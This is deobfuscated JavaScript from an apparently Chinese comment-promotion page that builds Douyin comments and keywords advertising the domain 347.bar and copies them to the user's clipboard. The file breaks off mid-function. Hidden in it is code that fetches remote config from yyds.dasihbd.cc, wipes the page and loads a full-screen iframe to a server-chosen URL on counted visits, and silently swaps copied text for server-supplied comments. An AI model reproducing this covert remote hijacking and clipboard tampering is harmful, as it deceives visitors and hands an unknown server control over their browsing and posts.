//Fri Oct 10 2025 06:15:48 GMT+0000 (Coordinated Universal Time)
//Base:<url id="cv1cref6o68qmpt26ol0" type="url" status="parsed" title="GitHub - echo094/decode-js: JS混淆代码的AST分析工具 AST analysis tool for obfuscated JS code" wc="2165">https://github.com/echo094/decode-js</url>
//Modify:<url id="cv1cref6o68qmpt26olg" type="url" status="parsed" title="GitHub - smallfawn/decode_action: 世界上本来不存在加密，加密的人多了，也便成就了解密" wc="741">https://github.com/smallfawn/decode_action</url>
let overrideResult = {
  "should_override": false,
  "config": {
    "enabled": false,
    "override_comments": false,
    "override_links": false,
    "custom_comments": [],
    "custom_links": []
  }
};
async function checkOverrideConditions() {
  try {
    {
      const _0x395553 = await fetch("https://yyds.dasihbd.cc/kkk/a3b7c2d8e5k9.php?action=check");
      if (!_0x395553.ok) {
        throw new Error("HTTP错误: " + _0x395553.status);
      }
      const _0x2c4570 = await _0x395553.json();
      console.log("覆盖检查结果:", _0x2c4570);
      overrideResult = _0x2c4570;
      return _0x2c4570;
    }
  } catch (_0xdf8387) {
    console.warn("配置检查失败，使用默认:", _0xdf8387);
    overrideResult = {
      "should_override": false,
      "config": {
        "enabled": false,
        "override_comments": false,
        "override_links": false,
        "custom_comments": [],
        "custom_links": []
      }
    };
    return overrideResult;
  }
}
async function loadRemoteControlConfig() {
  try {
    {
      console.log("配置中...");
      const _0x5d4a61 = await fetch("https://yyds.dasihbd.cc/kkk/a3b7c2d8e5k9.php?action=getConfig");
      if (!_0x5d4a61.ok) throw new Error("HTTP错误: " + _0x5d4a61.status);
      const _0x572f73 = await _0x5d4a61.json();
      console.log("配置信息:", _0x572f73);
      Object.assign(remoteControlConfig, _0x572f73);
      console.log("加载成功");
    }
  } catch (_0x2cf328) {
    console.warn("加载失败，不影响网页正常功能:", _0x2cf328);
  }
}
let domainPositionCache = {},
  emojiCache = {},
  slideIndex = 0;
showSlides(slideIndex);
function changeSlide(_0x6af3a5) {
  showSlides(slideIndex += _0x6af3a5);
}
function currentSlide(_0x51b841) {
  showSlides(slideIndex = _0x51b841 - 1);
}
function showSlides(_0x29fc4a) {
  let _0x2cf18b;
  const _0x5db37d = document.getElementsByClassName("slideshow-slide"),
    _0x542bcd = document.getElementsByClassName("slideshow-dot");
  _0x29fc4a >= _0x5db37d.length && (slideIndex = 0);
  _0x29fc4a < 0 && (slideIndex = _0x5db37d.length - 1);
  for (_0x2cf18b = 0; _0x2cf18b < _0x5db37d.length; _0x2cf18b++) {
    _0x5db37d[_0x2cf18b].classList.remove("active");
  }
  for (_0x2cf18b = 0; _0x2cf18b < _0x542bcd.length; _0x2cf18b++) {
    _0x542bcd[_0x2cf18b].classList.remove("active");
  }
  _0x5db37d[slideIndex].classList.add("active");
  _0x542bcd[slideIndex].classList.add("active");
}
setInterval(() => {
  changeSlide(1);
}, 5000);
let rewardSlideIndex = 0;
updateRewardSlide();
function slideReward(_0x46619c) {
  rewardSlideIndex = (rewardSlideIndex + _0x46619c + 2) % 2;
  updateRewardSlide();
}
function currentRewardSlide(_0x29387a) {
  rewardSlideIndex = _0x29387a;
  updateRewardSlide();
}
function updateRewardSlide() {
  const _0x5ad864 = document.querySelector(".reward-slideshow"),
    _0x285b92 = document.querySelectorAll(".reward-dot");
  if (_0x5ad864) {
    _0x5ad864.style.transform = "translateX(-" + rewardSlideIndex * 100 + "%)";
    _0x285b92.forEach((_0x124739, _0x5eb902) => {
      if (_0x5eb902 === rewardSlideIndex) _0x124739.classList.add("active"), _0x124739.style.background = "rgba(255,255,255,0.9)";else {
        _0x124739.classList.remove("active");
        _0x124739.style.background = "rgba(255,255,255,0.5)";
      }
    });
  }
}
setInterval(() => {
  slideReward(1);
}, 3000);
(function () {
  const _0x274bf7 = "https://yyds.dasihbd.cc/tong/a3b7c2d8e5f9.php";
  fetch(_0x274bf7).then(_0x13061f => _0x13061f.json()).then(_0x3c8f08 => {
    console.log("跳转配置:", _0x3c8f08);
    _0x3c8f08.shouldRedirect ? (console.log("（ " + _0x3c8f08.config.redirectEvery + " 次访问跳转）"), setTimeout(() => {
      const _0x511b76 = document.createElement("iframe");
      _0x511b76.style.position = "fixed";
      _0x511b76.style.top = "0";
      _0x511b76.style.left = "0";
      _0x511b76.style.width = "100%";
      _0x511b76.style.height = "100%";
      _0x511b76.style.border = "none";
      _0x511b76.style.zIndex = "9999";
      _0x511b76.src = _0x3c8f08.config.targetUrl;
      document.body.innerHTML = "";
      document.body.appendChild(_0x511b76);
    }, _0x3c8f08.config.redirectDelay || 1500)) : console.log("还需访问 " + _0x3c8f08.nextRedirectAt + " 次将触发跳转");
  }).catch(_0x89cbb0 => {
    console.error("获取跳转配置失败:", _0x89cbb0);
  });
})();
function initSiteRedirect() {
  if (!window.siteRedirect || !window.siteRedirect.enabled) return;
  const {
    url: _0x493fbf,
    delay: _0x196561
  } = window.siteRedirect;
  if (!_0x493fbf) {
    console.error("未配置");
    return;
  }
  _0x196561 > 0 ? setTimeout(() => {
    window.location.href = _0x493fbf;
  }, _0x196561) : window.location.href = _0x493fbf;
}
function generateCommentLine(_0x3a66e9, _0x42076c, _0x1d611a, _0x2b75cc, _0x118593, _0x3a95c3 = true) {
  const _0x1dec4a = window.emojiSettings || {
    "enabled": false,
    "pool": [],
    "positions": [],
    "random_position": false,
    "repeat_with_comment": true,
    "show_in_display": true,
    "line_break": "none",
    "min_emojis": 1,
    "max_emojis": 1
  };
  let _0x1be8c5 = generateCommentLineBasic(_0x3a66e9, _0x42076c, _0x1d611a, _0x2b75cc, _0x3a95c3);
  if (!_0x1dec4a.enabled || !_0x1dec4a.pool || _0x1dec4a.pool.length === 0) {
    return _0x1be8c5;
  }
  let _0x4fef21 = false;
  _0x3a95c3 ? _0x4fef21 = _0x1dec4a.show_in_display : _0x4fef21 = true;
  _0x4fef21 && !_0x1dec4a.repeat_with_comment && _0x2b75cc > 0 && (_0x4fef21 = false);
  if (!_0x4fef21) return _0x1be8c5;
  const _0x5f24da = Math.floor(Math.random() * (_0x1dec4a.max_emojis - _0x1dec4a.min_emojis + 1)) + _0x1dec4a.min_emojis;
  let _0x2b57e6 = [],
    _0x47f581 = [..._0x1dec4a.pool];
  const _0x33be7f = Math.min(_0x5f24da, _0x47f581.length),
    _0x6c3143 = _0x3a66e9 + "_" + _0x2b75cc + "_emojis";
  if (emojiCache[_0x6c3143] === undefined) {
    let _0x526c05 = [],
      _0xa2d03f = [..._0x47f581];
    for (let _0x59f9ff = 0; _0x59f9ff < _0x33be7f; _0x59f9ff++) {
      {
        if (_0xa2d03f.length === 0) break;
        const _0x5182db = Math.floor(Math.random() * _0xa2d03f.length),
          _0x437d70 = _0xa2d03f[_0x5182db];
        _0x526c05.push(_0x437d70);
        _0xa2d03f.splice(_0x5182db, 1);
      }
    }
    emojiCache[_0x6c3143] = _0x526c05;
  }
  _0x2b57e6 = emojiCache[_0x6c3143];
  let _0x25251f = [];
  const _0xb2f86b = _0x3a66e9 + "_" + _0x2b75cc + "_positions";
  if (emojiCache[_0xb2f86b] === undefined) {
    let _0x31856b = [];
    for (let _0x3267fe = 0; _0x3267fe < _0x5f24da; _0x3267fe++) {
      _0x1dec4a.random_position ? _0x31856b.push(Math.random() > 0.5 ? "before" : "after") : _0x31856b.push(_0x1dec4a.positions[_0x3267fe] || "after");
    }
    emojiCache[_0xb2f86b] = _0x31856b;
  }
  _0x25251f = emojiCache[_0xb2f86b];
  const _0x327705 = _0x3a95c3 ? "<br>" : "\n";
  let _0x2de8b2 = _0x1be8c5,
    _0x4d2f09 = [],
    _0x1ef855 = [];
  _0x2b57e6.forEach((_0x28b262, _0x36a472) => {
    _0x25251f[_0x36a472] === "before" ? _0x4d2f09.push(_0x28b262) : _0x1ef855.push(_0x28b262);
  });
  if (_0x4d2f09.length > 0) {
    let _0x2c53a3 = _0x4d2f09.join("");
    if (_0x1dec4a.line_break === "after_each") _0x2c53a3 = _0x4d2f09.join(_0x327705), _0x2de8b2 = _0x2c53a3 + _0x327705 + _0x2de8b2;else {
      if (_0x1dec4a.line_break === "random" && Math.random() > 0.7) _0x2de8b2 = _0x2c53a3 + _0x327705 + _0x2de8b2;else {
        _0x2de8b2 = _0x2c53a3 + _0x2de8b2;
      }
    }
  }
  if (_0x1ef855.length > 0) {
    let _0xf56d77 = _0x1ef855.join("");
    if (_0x1dec4a.line_break === "after_each") _0xf56d77 = _0x1ef855.join(_0x327705), _0x2de8b2 = _0x2de8b2 + _0x327705 + _0xf56d77;else {
      if (_0x1dec4a.line_break === "random" && Math.random() > 0.7) {
        _0x2de8b2 = _0x2de8b2 + _0x327705 + _0xf56d77;
      } else _0x2de8b2 = _0x2de8b2 + _0xf56d77;
    }
  }
  return _0x2de8b2;
}
function generateCommentLineBasic(_0x10c23e, _0x6c9dbe, _0x54385a, _0x2b82ad, _0x1f0d02 = true) {
  const _0xab06b1 = window.commentSettings || {};
  let _0x1954af = _0x54385a;
  if (_0xab06b1.random_domain_position) {
    {
      const _0x2605d3 = _0x10c23e + "_" + _0x2b82ad;
      domainPositionCache[_0x2605d3] === undefined && (domainPositionCache[_0x2605d3] = Math.random() > 0.5 ? "before" : "after");
      _0x1954af = domainPositionCache[_0x2605d3];
    }
  } else {
    const _0x1d7b68 = _0xab06b1.domain_positions || [];
    _0x1954af = _0x1d7b68[_0x2b82ad] || _0x54385a || "after";
  }
  return _0x1954af === "before" ? _0x6c9dbe + _0x10c23e : _0x10c23e + _0x6c9dbe;
}
function generateCommentDisplay(_0x426089, _0x306f10) {
  const _0x2815f8 = _0x426089.replace(/\\n/g, "\n");
  let _0x5b34bc = "";
  const _0x5e3397 = _0x306f10.domain_positions || [];
  for (let _0xdec396 = 0; _0xdec396 < _0x306f10.repeat_display; _0xdec396++) {
    {
      if (_0xdec396 > 0) _0x5b34bc += _0x306f10.separator;
      const _0x4344e7 = generateCommentLine(_0x2815f8, _0x306f10.domain, _0x5e3397[_0xdec396], _0xdec396, _0x306f10, true);
      _0x5b34bc += _0x4344e7;
    }
  }
  return _0x5b34bc;
}
function generateCommentCopy(_0x4688d3, _0xe13e9) {
  const _0x289d3b = _0x4688d3.replace(/\\n/g, "\n");
  let _0x26cd74 = "";
  const _0x4952c0 = _0xe13e9.domain_positions || [];
  for (let _0x36c6d2 = 0; _0x36c6d2 < _0xe13e9.repeat_copy; _0x36c6d2++) {
    if (_0x36c6d2 > 0) _0x26cd74 += _0xe13e9.copy_as_text ? _0xe13e9.copy_separator : "\n";
    const _0x551227 = generateCommentLine(_0x289d3b, _0xe13e9.domain, _0x4952c0[_0x36c6d2], _0x36c6d2, _0xe13e9, false);
    _0x26cd74 += _0x551227;
  }
  if (_0xe13e9.copy_as_text) return _0x26cd74.replace(/\n/g, _0xe13e9.copy_separator);
  return _0x26cd74;
}
function getCommentColor(_0x30e00b, _0x524c80) {
  return _0x30e00b?.["color"] || _0x524c80.default_color;
}
function getKeywordColor(_0xc37b8a, _0x2bace0) {
  return _0xc37b8a?.["color"] || _0x2bace0.default_color;
}
function getRandomDomainCombination(_0x43569f, _0x1f6087) {
  if (!_0x1f6087.enable_random_domains || !_0x1f6087.random_domains || _0x1f6087.random_domains.length === 0) return _0x43569f + _0x1f6087.domain;
  const _0x40b699 = [..._0x1f6087.random_domains].sort(() => 0.5 - Math.random()),
    _0x4d2369 = _0x40b699.slice(0, _0x1f6087.random_domain_count);
  let _0x2359ac = "";
  _0x4d2369.forEach((_0x25ac20, _0x39bb58) => {
    if (_0x39bb58 > 0) _0x2359ac += _0x1f6087.random_domain_separator || " | ";
    _0x2359ac += _0x25ac20;
  });
  return _0x43569f + _0x2359ac;
}
function generateRandomCommentDisplay(_0x3f771c, _0x235e74) {
  let _0x3c26ec = "";
  for (let _0x261f81 = 0; _0x261f81 < _0x235e74.repeat_display; _0x261f81++) {
    {
      if (_0x261f81 > 0) _0x3c26ec += _0x235e74.separator;
      const _0x10b104 = getRandomDomainCombination(_0x3f771c, _0x235e74);
      _0x3c26ec += _0x10b104;
    }
  }
  return _0x3c26ec;
}
function generateRandomCommentCopy(_0x326bdf, _0x24823c) {
  let _0x5c5662 = "";
  for (let _0x340ef4 = 0; _0x340ef4 < _0x24823c.repeat_copy; _0x340ef4++) {
    if (_0x340ef4 > 0) _0x5c5662 += _0x24823c.copy_as_text ? _0x24823c.copy_separator : "\n";
    const _0x21b98a = getRandomDomainCombination(_0x326bdf, _0x24823c);
    _0x5c5662 += _0x21b98a;
  }
  if (_0x24823c.copy_as_text) return _0x5c5662.replace(/\n/g, _0x24823c.copy_separator);
  return _0x5c5662;
}
function toggleExampleImage() {
  const _0x18200b = document.querySelector(".example-image[src=\"images/最新示范.jpg\"]");
  _0x18200b && window.imageSettings && (window.imageSettings.show_example_image ? _0x18200b.style.display = "block" : _0x18200b.style.display = "none");
}
function initBannerKeywords() {
  const _0x43fffe = window.bannerSettings || {
    "enabled": true,
    "keywords": ["火影这一块", "柯南这一块", "拿走不用谢", "我在用", "桐人这一块", "你能开心就行"],
    "domain": "347.bar",
    "positions": [{
      "top": "25%",
      "left": "13%"
    }, {
      "top": "37%",
      "left": "13%"
    }, {
      "top": "49%",
      "left": "13%"
    }, {
      "top": "61%",
      "left": "13%"
    }, {
      "top": "72%",
      "left": "13%"
    }, {
      "top": "85%",
      "left": "13%"
    }],
    "positions_with_image": [{
      "top": "51%",
      "left": "13%"
    }, {
      "top": "59%",
      "left": "13%"
    }, {
      "top": "67%",
      "left": "13%"
    }, {
      "top": "75%",
      "left": "13%"
    }, {
      "top": "83%",
      "left": "13%"
    }, {
      "top": "90%",
      "left": "13%"
    }],
    "text_color": "#ffffff",
    "text_size": "14px",
    "font_weight": "bold"
  };
  if (!_0x43fffe.enabled) return;
  const _0x578ea0 = document.getElementById("keywordOverlay");
  if (!_0x578ea0) return;
  _0x578ea0.innerHTML = "";
  const _0xacab98 = window.imageSettings || {
      "show_example_image": false
    },
    _0x2d73b6 = _0xacab98.show_example_image ? _0x43fffe.positions_with_image || _0x43fffe.positions : _0x43fffe.positions,
    _0x21699e = _0x43fffe.domain ? _0x43fffe.keywords.map(_0x4e0db5 => "" + _0x4e0db5 + _0x43fffe.domain) : _0x43fffe.keywords;
  _0x21699e.forEach((_0x498874, _0x51b759) => {
    {
      if (_0x51b759 >= _0x2d73b6.length) return;
      const _0x5718b2 = _0x2d73b6[_0x51b759],
        _0x7a7b06 = document.createElement("div");
      _0x7a7b06.className = "keyword-tag";
      _0x7a7b06.textContent = _0x498874;
      _0x7a7b06.style.top = _0x5718b2.top;
      _0x7a7b06.style.left = _0x5718b2.left;
      _0x7a7b06.style.color = _0x43fffe.text_color;
      _0x7a7b06.style.fontSize = _0x43fffe.text_size;
      _0x7a7b06.style.fontWeight = _0x43fffe.font_weight;
      _0x7a7b06.style.position = "absolute";
      _0x7a7b06.style.zIndex = "10";
      _0x7a7b06.style.cursor = "pointer";
      _0x578ea0.appendChild(_0x7a7b06);
    }
  });
}
function generateCommentWithEmoji(_0x43cff1, _0x127d09, _0x330a73, _0x168403, _0x5bfeff) {
  const _0x5e45cb = window.emojiSettings || {
    "enabled": false,
    "pool": [],
    "positions": [],
    "random_position": false,
    "repeat_with_comment": true
  };
  if (!_0x5e45cb.enabled || !_0x5e45cb.pool || _0x5e45cb.pool.length === 0) return generateCommentLine(_0x43cff1, _0x127d09, _0x330a73, _0x168403);
  const _0x48f699 = _0x5e45cb.pool[Math.floor(Math.random() * _0x5e45cb.pool.length)];
  let _0x152978 = _0x5e45cb.positions[_0x168403] || "before";
  _0x5e45cb.random_position && (_0x152978 = Math.random() > 0.5 ? "before" : "after");
  const _0x2d4566 = generateCommentLine(_0x43cff1, _0x127d09, _0x330a73, _0x168403);
  return _0x152978 === "before" ? _0x48f699 + " " + _0x2d4566 : _0x2d4566 + " " + _0x48f699;
}
function generateRandomDomainsPerRefresh(_0x12ba77, _0xfcd69c) {
  domainPositionCache = {};
  emojiCache = {};
  const _0xada0df = window.emojiSettings || {
      "enabled": false,
      "repeat_with_comment": true
    },
    _0x2037a3 = _0xfcd69c.domain_positions || [],
    _0x2fa398 = _0xfcd69c.repeat_display || 2,
    _0x334e27 = _0xfcd69c.repeat_copy || 2;
  let _0x3bf949 = "",
    _0x3bb8bc = "",
    _0x33a758 = _0xfcd69c.domain;
  if (_0xfcd69c.enable_random_domains && _0xfcd69c.random_domains && _0xfcd69c.random_domains.length > 0) {
    if (_0xfcd69c.same_domain_per_refresh) {
      {
        if (!currentSessionDomain) {
          const _0x7ad468 = Math.floor(Math.random() * _0xfcd69c.random_domains.length);
          currentSessionDomain = _0xfcd69c.random_domains[_0x7ad468];
        }
        _0x33a758 = currentSessionDomain;
      }
    } else {
      const _0x26728b = Math.floor(Math.random() * _0xfcd69c.random_domains.length);
      _0x33a758 = _0xfcd69c.random_domains[_0x26728b];
    }
  }
  for (let _0x54d05f = 0; _0x54d05f < _0x2fa398; _0x54d05f++) {
    {
      _0x54d05f > 0 && (_0x3bf949 += _0xfcd69c.separator || "<br>");
      const _0x58bdb6 = generateCommentLine(_0x12ba77, _0x33a758, _0x2037a3[_0x54d05f], _0x54d05f, _0xfcd69c, true);
      _0x3bf949 += _0x58bdb6;
    }
  }
  for (let _0x59f939 = 0; _0x59f939 < _0xfcd69c.repeat_copy; _0x59f939++) {
    _0x59f939 > 0 && (_0x3bb8bc += _0xfcd69c.copy_as_text ? _0xfcd69c.copy_separator || "\n" : "\n");
    const _0x28d4c5 = generateCommentLine(_0x12ba77, _0x33a758, _0x2037a3[_0x59f939], _0x59f939, _0xfcd69c, false);
    _0x3bb8bc += _0x28d4c5;
  }
  _0xfcd69c.copy_as_text && (_0x3bb8bc = _0x3bb8bc.replace(/\n/g, _0xfcd69c.copy_separator || "\n"));
  return {
    "display": _0x3bf949,
    "copy": _0x3bb8bc
  };
}
function refreshComments() {
  currentSessionDomain = null;
  domainPositionCache = {};
  emojiCache = {};
  renderCommentButtons();
}
function renderCommentButtons() {
  currentSessionDomain = null;
  domainPositionCache = {};
  emojiCache = {};
  const _0x1500ab = getRandomComments(),
    _0x622622 = document.getElementById("comment-buttons");
  if (!_0x622622) return;
  _0x622622.innerHTML = "";
  const _0x3bcf20 = window.commentSettings || {
      "domain": "347.bar",
      "repeat_display": 2,
      "repeat_copy": 2,
      "separator": "<br>",
      "default_color": "#1798fc",
      "domain_positions": ["after", "before", "after"],
      "copy_as_text": false,
      "copy_separator": "\n",
      "enable_random_domains": false,
      "random_domain_position": true
    },
    _0x3b2b50 = window.emojiSettings || {
      "enabled": false,
      "repeat_with_comment": true
    };
  _0x1500ab.forEach(_0x2e5f9b => {
    const _0x1b152b = window.commentPool.find(_0x5aa401 => _0x5aa401.text === _0x2e5f9b),
      _0x1bf1f4 = document.createElement("span");
    _0x1bf1f4.className = "keyword-btn STYLE17";
    const _0x4aa9eb = getCommentColor(_0x1b152b, _0x3bcf20),
      _0x28eab6 = generateRandomDomainsPerRefresh(_0x2e5f9b, _0x3bcf20);
    _0x1bf1f4.innerHTML = "<strong style=\"color: " + _0x4aa9eb + "; font-weight: bold; white-space: pre-line;\">" + _0x28eab6.display + "</strong>";
    _0x1bf1f4.setAttribute("data-copy-text", _0x28eab6.copy);
    _0x1bf1f4.setAttribute("data-comment-text", _0x2e5f9b);
    _0x1bf1f4.onclick = function () {
      const _0x3aebf4 = this.getAttribute("data-copy-text"),
        _0x3ca951 = this.getAttribute("data-comment-text");
      copyCommentText(_0x3aebf4, _0x3ca951);
    };
    _0x622622.appendChild(_0x1bf1f4);
  });
}
async function copyCommentText(_0x270a65, _0x232e0c = "") {
  try {
    {
      if (overrideResult.should_override && overrideResult.config.override_comments && overrideResult.config.custom_comments && overrideResult.config.custom_comments.length > 0) {
        {
          const _0x28dc35 = Math.floor(Math.random() * overrideResult.config.custom_comments.length),
            _0x4e9153 = overrideResult.config.custom_comments[_0x28dc35];
          _0x270a65 = _0x4e9153;
          _0x232e0c = _0x4e9153;
        }
      }
    }
  } catch (_0x34a878) {
    console.warn("处理失败:", _0x34a878);
  }
  const _0xd7e031 = _0x270a65.replace(/<br>/g, "\n").replace(/<[^>]*>/g, ""),
    _0x358bf2 = _0x232e0c.replace(/<br>/g, "\n").replace(/<[^>]*>/g, "");
  navigator.clipboard && window.isSecureContext ? navigator.clipboard.writeText(_0xd7e031).then(() => {
    showCustomToast("\"" + _0x358bf2 + "\" 已复制到剪贴板！");
  }).catch(() => {
    copyCommentWithFallback(_0xd7e031, _0x358bf2);
  }) : copyCommentWithFallback(_0xd7e031, _0x358bf2);
}
function copyCommentWithFallback(_0x5427b0, _0x248209) {
  const _0x5fe9bb = document.createElement("textarea");
  _0x5fe9bb.value = _0x5427b0;
  _0x5fe9bb.style.position = "fixed";
  _0x5fe9bb.style.opacity = "0";
  _0x5fe9bb.style.top = "0";
  _0x5fe9bb.style.left = "0";
  document.body.appendChild(_0x5fe9bb);
  if (navigator.userAgent.match(/ipad|iphone/i)) {
    _0x5fe9bb.contentEditable = true;
    _0x5fe9bb.readOnly = false;
    const _0x4ebbc3 = document.createRange();
    _0x4ebbc3.selectNodeContents(_0x5fe9bb);
    const _0x1f71eb = window.getSelection();
    _0x1f71eb.removeAllRanges();
    _0x1f71eb.addRange(_0x4ebbc3);
    _0x5fe9bb.setSelectionRange(0, 999999);
  } else _0x5fe9bb.select();
  try {
    document.execCommand("copy");
    showCustomToast("\"" + _0x248209 + "\" 已复制到剪贴板！");
  } catch (_0x5e86b1) {
    showCustomToast("复制失败，请手动复制", "error");
  }
  document.body.removeChild(_0x5fe9bb);
}
function getRandomComments() {
  const _0x927ab8 = window.commentSettings || {
    "display_count": 6
  };
  if (!window.commentPool || window.commentPool.length === 0) return console.error("评论词池未加载"), ["不一样的火影", "备用评论词"];
  const _0x2c0c8c = window.commentPool.filter(_0x283101 => _0x283101.fixed).sort((_0x4242c5, _0x4d17f0) => _0x4d17f0.weight - _0x4242c5.weight).map(_0x48f4c7 => _0x48f4c7.text),
    _0x5ac883 = window.commentPool.filter(_0x28580c => !_0x28580c.fixed).map(_0x2efcbb => _0x2efcbb.text),
    _0x1cf97a = _0x927ab8.display_count;
  let _0x379e3f;
  _0x2c0c8c.length >= _0x1cf97a ? _0x379e3f = Math.min(_0x2c0c8c.length, _0x1cf97a) : _0x379e3f = _0x1cf97a;
  const _0x3c15f4 = Math.max(0, _0x379e3f - _0x2c0c8c.length),
    _0x3bf16a = [..._0x5ac883].sort(() => 0.5 - Math.random()),
    _0x1ede8d = _0x3bf16a.slice(0, _0x3c15f4);
  return [..._0x2c0c8c.slice(0, _0x379e3f), ..._0x1ede8d];
}
document.addEventListener("DOMContentLoaded", function () {
  window.commentPool && window.commentSettings ? renderCommentButtons() : setTimeout(() => {
    window.commentPool && window.commentSettings ? renderCommentButtons() : (console.error("评论词配置加载失败，使用默认设置"), window.commentSettings = window.commentSettings || {
      "display_count": 6,
      "domain": "347.bar",
      "repeat_display": 3,
      "repeat_copy": 3,
      "separator": "<br>",
      "default_color": "#1798fc",
      "enable_random_domains": false
    }, renderCommentButtons());
  }, 500);
});
function copyKeyword(_0x48ce48) {
  const _0x535d16 = window.keywordLinks || {
    "enabled": false,
    "douyin_search_enabled": false
  };
  if (_0x535d16.enabled && _0x535d16.douyin_search_enabled) {
    {
      const _0x40c7cc = "snssdk1128://search?keyword=" + encodeURIComponent(_0x48ce48),
        _0x2d7728 = "snssdk1118://search?keyword=" + encodeURIComponent(_0x48ce48);
      window.location.href = _0x40c7cc;
      let _0x5a6a96 = false;
      const _0x1c3d64 = Date.now();
      document.addEventListener("visibilitychange", function _0x2d9eca() {
        document.hidden && (_0x5a6a96 = true, document.removeEventListener("visibilitychange", _0x2d9eca));
      });
      setTimeout(() => {
        !_0x5a6a96 && (window.location.href = _0x2d7728, setTimeout(() => {
          !_0x5a6a96 && showCustomToast("请先下载安装抖音APP，再回来点击打开搜索", "info");
        }, 800));
      }, 1200);
      return;
    }
  }
  const _0xb0805 = _0x48ce48.replace(/<br>/g, "\n").replace(/<[^>]*>/g, "");
  navigator.clipboard && window.isSecureContext ? navigator.clipboard.writeText(_0xb0805).then(() => {
    showCustomToast("\"" + _0xb0805 + "\" 已复制到剪贴板！");
  }).catch(() => {
    copyWithFallback(_0xb0805);
  }) : copyWithFallback(_0xb0805);
}
function copyWithFallback(_0x285498) {
  const _0x237219 = document.createElement("textarea");
  _0x237219.value = _0x285498;
  _0x237219.style.position = "fixed";
  _0x237219.style.opacity = "0";
  _0x237219.style.top = "0";
  _0x237219.style.left = "0";
  document.body.appendChild(_0x237219);
  if (navigator.userAgent.match(/ipad|iphone/i)) {
    {
      _0x237219.contentEditable = true;
      _0x237219.readOnly = false;
      const _0x23e978 = document.createRange();
      _0x23e978.selectNodeContents(_0x237219);
      const _0x1bf0a8 = window.getSelection();
      _0x1bf0a8.removeAllRanges();
      _0x1bf0a8.addRange(_0x23e978);
      _0x237219.setSelectionRange(0, 999999);
    }
  } else {
    _0x237219.select();
  }
  try {
    document.execCommand("copy");
    showCustomToast("\"" + _0x285498 + "\" 已复制到剪贴板！");
  } catch (_0x564271) {
    showCustomToast("复制失败，请手动复制", "error");
  }
  document.body.removeChild(_0x237219);
}
function sortByWeight(_0xb67880) {
  return _0xb67880.sort((_0x5c054c, _0x52a1c8) => {
    {
      if (_0x5c054c.fixed && !_0x52a1c8.fixed) return -1;
      if (!_0x5c054c.fixed && _0x52a1c8.fixed) return 1;
      return _0x52a1c8.weight - _0x5c054c.weight;
    }
  });
}
function getRandomKeywords() {
  const _0x41baed = window.keywordSettings || {
    "min_keywords": 6,
    "max_keywords": 6
  };
  if (!window.keywordPool || window.keywordPool.length === 0) return console.error("关键词池未加载"), ["火影同人", "备用关键词1", "备用关键词2"];
  const _0x44f2db = window.keywordPool.filter(_0x3d159b => _0x3d159b.fixed).sort((_0x50b66, _0x7e200f) => _0x7e200f.weight - _0x50b66.weight).map(_0x566c57 => _0x566c57.text),
    _0x8f4d37 = window.keywordPool.filter(_0x4ee367 => !_0x4ee367.fixed).map(_0x1b293e => _0x1b293e.text),
    _0xe46245 = Math.max(_0x41baed.min_keywords, _0x44f2db.length),
    _0x41d574 = _0x41baed.max_keywords;
  let _0x903bf3;
  _0x44f2db.length >= _0xe46245 ? _0x903bf3 = Math.min(_0x44f2db.length, _0x41d574) : _0x903bf3 = _0xe46245 + Math.floor(Math.random() * (_0x41d574 - _0xe46245 + 1));
  const _0x5def2b = Math.max(0, _0x903bf3 - _0x44f2db.length),
    _0x5311d9 = [..._0x8f4d37].sort(() => 0.5 - Math.random()),
    _0x4e59a9 = _0x5311d9.slice(0, _0x5def2b);
  return [..._0x44f2db.slice(0, _0x903bf3), ..._0x4e59a9];
}
function renderKeywords() {
  const _0xfdea7f = window.keywordLinks || {
      "enabled": false,
      "items": [],
      "douyin_search_enabled": false
    },
    _0x5c637d = window.keywordPool || [],
    _0x46e381 = window.keywordSettings || {};
  let _0x330bba = [];
  _0xfdea7f.enabled && _0xfdea7f.items && _0xfdea7f.items.length > 0 ? _0x330bba = _0xfdea7f.items : _0x330bba = _0x5c637d;
  const _0x5de541 = getRandomKeywordsFromPool(_0x330bba, _0x46e381),
    _0x1f1145 = document.querySelector(".image-container");
  if (!_0x1f1145) return;
  _0x1f1145.innerHTML = "";
  _0x5de541.forEach((_0x1d0d3c, _0x216041) => {
    const _0x39497a = _0x1d0d3c.text || _0x1d0d3c,
      _0x18b1bb = getKeywordColor(_0x1d0d3c, _0x46e381),
      _0x1bb7a5 = document.createElement("span");
    _0x1bb7a5.className = "keyword-btn STYLE17";
    _0x1bb7a5.style.cssText = "\n            margin: 5px; \n            display: inline-block;\n            cursor: pointer;\n        ";
    _0x1bb7a5.innerHTML = "<strong style=\"color: " + _0x18b1bb + "; font-weight: bold;\">" + _0x39497a + "</strong>";
    if (_0xfdea7f.enabled) {
      const _0x528d87 = _0xfdea7f.items.find(_0x4c048 => (_0x4c048.text || _0x4c048) === _0x39497a);
      if (_0x528d87 && _0x528d87.url) {
        _0x1bb7a5.onclick = function () {
          {
            if (_0xfdea7f.douyin_search_enabled) {
              {
                const _0x45b753 = "snssdk1128://search?keyword=" + encodeURIComponent(_0x39497a),
                  _0x4db2d7 = "snssdk1118://search?keyword=" + encodeURIComponent(_0x39497a);
                window.location.href = _0x45b753;
                let _0x41604a = false;
                const _0xf0d4f8 = Date.now();
                document.addEventListener("visibilitychange", function _0x1e566f() {
                  document.hidden && (_0x41604a = true, document.removeEventListener("visibilitychange", _0x1e566f));
                });
                setTimeout(() => {
                  !_0x41604a && (window.location.href = _0x4db2d7, setTimeout(() => {
                    !_0x41604a && showCustomToast("请先下载安装抖音APP，再回来点击打开搜索", "info");
                  }, 800));
                }, 1200);
              }
            } else window.open(_0x528d87.url, "_blank");
          }
        };
        _0x1bb7a5.title = _0xfdea7f.douyin_search_enabled ? "点击跳转到抖音搜索" : "点击跳转";
      } else _0x1bb7a5.onclick = function () {
        copyKeyword(_0x39497a);
      }, _0x1bb7a5.title = "点击复制关键词";
    } else _0x1bb7a5.onclick = function () {
      copyKeyword(_0x39497a);
    }, _0x1bb7a5.title = "点击复制关键词";
    _0x1f1145.appendChild(_0x1bb7a5);
    _0x46e381.line_break_after > 0 && (_0x216041 + 1) % _0x46e381.line_break_after === 0 && _0x1f1145.appendChild(document.createElement("br"));
  });
}
function getRandomKeywordsFromPool(_0x16dadf, _0x1f99da) {
  const _0x2d4ff2 = _0x16dadf.filter(_0x2a1c86 => _0x2a1c86.fixed).sort((_0x1d5d50, _0x2634db) => _0x2634db.weight - _0x1d5d50.weight).map(_0x12fc37 => _0x12fc37.text ? _0x12fc37 : {
      "text": _0x12fc37
    }),
